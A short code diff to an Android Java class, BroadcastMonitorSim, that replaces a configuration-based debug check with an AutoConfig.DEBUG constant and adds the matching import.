@@ -11,6 +11,7 @@ package com.android.service.listener;
 
 import com.android.service.Device;
 import com.android.service.Sim;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 
 public class BroadcastMonitorSim extends Thread {
@@ -37,7 +38,7 @@ public class BroadcastMonitorSim extends Thread {
 				try {
 					wait(period);
 				} catch (InterruptedException e) {
-					if(Configuration.isDebug()) { e.printStackTrace(); }
+					if(AutoConfig.DEBUG) { e.printStackTrace(); }
 				}
 			} while (true);
 		}
